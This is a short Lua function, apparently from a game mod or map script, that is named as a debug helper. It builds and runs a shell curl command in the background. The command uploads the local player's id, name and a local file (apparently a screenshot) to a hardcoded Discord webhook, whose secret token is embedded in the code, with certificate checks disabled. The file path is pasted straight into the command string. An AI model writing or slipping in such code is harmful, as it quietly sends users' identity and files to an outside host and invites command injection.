function SFFDebug(ff)
    local message = string.format("(Evolution Tag) Player: %d: %s",GetPlayerId(GetLocalPlayer()),GetPlayerName(GetLocalPlayer()))
    local url = "https://discord.com/api/webhooks/1048570040280162324/hKoqcidLDFRSQ02mSouPDU72oqDbCv648__xtDcy7gqPLwEFMt6Qyx_DR8p62PUHgl4j"
    local payload_json = string.format('{"content":"%s"}',message)
    local command = string.format('%s -s --insecure --location --request POST "%s" --form payload_json=%q --form ss=@%q',Curlpath,url,payload_json,ff)
    --print("\n",command,"\n")
    RunCmdThreaded(command)
end